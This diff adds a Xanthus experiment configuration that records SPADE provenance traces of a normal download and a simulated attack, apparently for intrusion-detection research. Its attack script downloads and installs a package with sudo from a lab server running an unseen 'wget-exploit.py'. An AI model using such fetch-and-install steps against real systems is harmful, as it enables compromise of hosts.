@@ -1,0 +1,116 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+Xanthus.configure do |config|
+  config.name = 'spade'
+  config.authors = 'Xueyuan Michael Han'
+  config.description = %q{
+A simple SPADE example to demonstrate:
+
+* Xanthus' compatibility with SPADE, a provenance capture system, as its underlying audit system
+* Xanthus supports running same experiments with various capture systems
+
+The exact same experiments are run in this script as in CamFlow example.
+
+Everything is done automatically through scripts for reproducility with minimum human interaction.
+}
+  config.seed = 21789605364839991191189884954466724277
+
+  config.script :spade_start do
+    Xanthus::SPADE_START
+  end
+
+  config.script :spade_stop do
+    Xanthus::SPADE_STOP
+  end
+
+  config.script :pre do
+    %q{%{
+      mkdir wgets
+      cd wgets
+      sleep 5
+    }}
+  end
+
+  config.script :normal do
+    %q{%{
+      /usr/local/bin/wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
+      sudo dpkg -i ipscan_3.5.5_amd64.deb
+      rm ipscan_3.5.5_amd64.deb
+      sleep 5
+    }}
+  end
+
+  config.script :attack do
+    %q{%{
+      /usr/local/bin/wget 192.168.33.3/ipscan_3.5.5_amd64.deb
+      sudo dpkg -i ipscan_3.5.5_amd64.deb
+      rm ipscan_3.5.5_amd64.deb
+      sleep 5
+    }}
+  end
+
+  config.script :post do
+    %q{%{
+      cd ..
+      rm -rf wgets
+    }}
+  end
+
+  config.script :server do
+    %q{%{
+      sudo apt-get -y update
+      sudo apt-get -y install build-essential
+      sudo apt-get -y install python-pip python-dev
+      sudo pip install pyftpdlib
+
+      mkdir /tmp/ftptest
+      cd /tmp/ftptest
+      cp /vagrant/ipscan_3.5.5_amd64.deb /tmp/ftptest
+      sudo python -m pyftpdlib -p21 -w &
+      sleep 5
+      mkdir /tmp/webtest
+      cd /tmp/webtest
+      wget https://github.com/angryip/ipscan/releases/download/3.5.5/ipscan_3.5.5_amd64.deb
+      sudo python /vagrant/wget-exploit.py 2>&1 & 
+    }}
+  end
+
+  # Use a customized SPADE virtual machine instead
+  config.vm :spade do |vm|
+    vm.box = 'michaelh/spade'
+    vm.memory = 8192
+    vm.version = '0.0.3'
+    vm.ip = '192.168.33.8'
+  end
+
+  config.vm :server do |vm|
+    vm.box = 'bento/ubuntu-18.04'
+    vm.version = '201812.27.0'
+    vm.ip = '192.168.33.3'
+  end
+
+  # Run the same experiments as CamFlow example, the only difference being the underlying audit system
+  # We can actually reuse the code and run both CamFlow and SPADE experiments/jobs in the same Xanthus project in the same .xanthus script
+  config.job :normal_spade do |job|
+    job.iterations = 2
+    job.tasks = {spade: [:pre, :spade_start, :normal, :spade_stop, :post]}
+    job.outputs = {spade: {trace: '/tmp/audit_cmd.avro'}}
+  end
+
+  config.job :attack_spade do |job|
+    job.iterations = 2
+    job.tasks = {server: [:server], spade: [:pre, :spade_start, :attack, :spade_stop, :post]}
+    job.inputs = {server: ['ipscan_3.5.5_amd64.deb', 'wget-exploit.py']}
+    job.outputs = {spade: {trace: '/tmp/audit_cdm.avro'}}
+  end
+
+  # config.github do |github|
+  #   github.repo = '<ADD GITHUB REPO user/name>'
+  #   github.token = '<ADD GITHUB TOKEN>'
+  # end
+end
